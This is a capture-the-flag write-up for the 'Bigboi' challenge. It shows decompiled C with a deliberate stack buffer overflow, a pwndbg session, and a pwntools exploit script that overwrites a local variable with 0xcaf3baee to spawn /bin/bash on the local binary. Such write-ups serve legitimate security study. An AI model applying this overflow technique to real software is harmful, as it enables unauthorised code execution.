# Bigboi

**24** bytes is being read into an **8** byte buffer, allowing a clobber of the **target** variable to pass the check and execute `/bin/bash`. 

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 buffer;
  undefined8 local_30;
  undefined4 uStack_28;
  int target;
  undefined4 local_20;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 40);
  buffer = 0;
  local_30 = 0;
  local_20 = 0;
  uStack_28 = 0;
  target = L'\xdeadbeef';
  puts("Are you a big boiiiii??");
  read(0,&buffer,24); // VULN
  if (target == L'\xcaf3baee') {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (canary != *(long *)(in_FS_OFFSET + 40)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

**20** Bytes of padding allows us to change `0xdeadbeef` to `0xcaf3baee`. 

```bash
python3 -c 'import pwn;print(b"A"*20 + pwn.p32(0xcaf3baee))' > payload
```

Check comparison is at `main+103`.
`
```
pwndbg> disassemble main
   ...
   0x00000000004006a5 <+100>:   mov    eax,DWORD PTR [rbp-0x1c]
   0x00000000004006a8 <+103>:   cmp    eax,0xcaf3baee
   ...
   
pwndbg> b *(main+103)
Breakpoint 1 at 0x4006a8
```

Running with the payload as input clobbers the area as expected and skip the `jne`.

```
pwndbg> r < payload
...
 ► 0x4006a8 <main+103>    cmp    eax, 0xcaf3baee     0xcaf3baee - 0xcaf3baee
   0x4006ad <main+108>    jne    main+122                    <main+122>
...
```

Automate that with a Python script

```python
#!/usr/bin/python3

from pwn import *

context.log_level = 'ERROR'

context.binary = elf = ELF("./boi", checksec=False)
p = process()

payload = b"A"*20 + p32(0xcaf3baee)

p.sendline(payload)
p.interactive()
```

To get a shell

```shell
python3 exploit.py

Are you a big boiiiii??
$ ls
boi  exploit.py  payload  README.md
```